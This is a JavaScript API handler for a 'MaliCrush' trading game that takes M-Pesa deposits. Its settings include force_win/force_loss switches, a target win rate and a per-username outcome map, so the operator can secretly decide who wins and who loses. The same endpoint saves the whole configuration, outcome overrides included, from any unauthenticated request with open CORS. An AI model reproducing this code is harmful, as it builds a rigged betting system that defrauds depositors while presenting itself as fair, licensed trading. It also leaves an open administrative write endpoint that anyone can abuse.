import { getDb, initDb } from './db.js';

const defaultSettings = {
  graph: {
    speed: 120,
    y_max: 3.0,
    max_pts: 80,
    spike_frequency: 0.12,
    crash_frequency: 0.02,
    base_level: 0.5,
    spike_max: 2.8,
    crash_depth: -2.8
  },
  trade: {
    max_multiplier: 5.0,
    prestart_wait: 3,
    autosell_multiplier: 2.5,
    duration: 60,
    min_stake: 10,
    max_stake: 50000,
    min_deposit: 50
  },
  controls: {
    force_outcome: "auto", // "auto" | "force_win" | "force_loss"
    target_win_rate: 45,
    user_outcomes: {} // { [username]: "win" | "loss" | "auto" }
  },
  withdraw: {
    min_withdrawal: 100,
    max_withdrawal: 100000
  },
  payments: {
    usd_rate: 129.00,
    deposit_currency: "kes",
    gateway: "payhero",
    payhero: {
      api_username: "",
      api_password: "",
      channel_id: "",
      callback_url: "",
      service_name: "MaliCrush M-Pesa"
    }
  },
  site: {
    name: "MaliCrush",
    tagline: "Trade Smart, Earn Big",
    licence: "BHA-0023-1873201"
  }
};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  await initDb();
  const db = getDb();

  // 1. SAVE SETTINGS (POST)
  if (req.method === 'POST') {
    const input = req.body || {};
    
    if (db) {
      try {
        // Read existing settings
        let currentSettings = { ...defaultSettings };
        const rows = await db`SELECT key, value FROM settings WHERE key = 'platform_config' LIMIT 1`;
        if (rows.length > 0) {
          try {
            currentSettings = { ...defaultSettings, ...JSON.parse(rows[0].value) };
          } catch(e) {}
        }

        // Merge inputs
        const updated = {
          ...currentSettings,
          ...input,
          controls: {
            ...currentSettings.controls,
            ...(input.controls || {}),
            force_outcome: input.force_outcome || input.controls?.force_outcome || currentSettings.controls.force_outcome,
            target_win_rate: input.target_win_rate !== undefined ? input.target_win_rate : (input.controls?.target_win_rate ?? currentSettings.controls.target_win_rate),
            user_outcomes: {
              ...currentSettings.controls.user_outcomes,
              ...(input.user_outcomes || input.controls?.user_outcomes || {})
            }
          }
        };

        if (input.user_override) {
          const { username, outcome } = input.user_override;
          if (username) {
            updated.controls.user_outcomes[username] = outcome || 'auto';
          }
        }

        const jsonStr = JSON.stringify(updated);
        await db`
          INSERT INTO settings (key, value)
          VALUES ('platform_config', ${jsonStr})
          ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
        `;

        return res.status(200).json({ success: true, settings: updated });
      } catch (err) {
        console.error('Error saving settings to DB:', err);
      }
    }

    return res.status(200).json({ success: true, settings: { ...defaultSettings, ...input } });
  }

  // 2. GET SETTINGS
  if (db) {
    try {
      const rows = await db`SELECT key, value FROM settings WHERE key = 'platform_config' LIMIT 1`;
      if (rows.length > 0) {
        const saved = JSON.parse(rows[0].value);
        return res.status(200).json({
          ...defaultSettings,
          ...saved,
          controls: {
            ...defaultSettings.controls,
            ...(saved.controls || {})
          }
        });
      }
    } catch (err) {
      console.error('Error fetching settings from DB:', err);
    }
  }

  return res.status(200).json(defaultSettings);
}
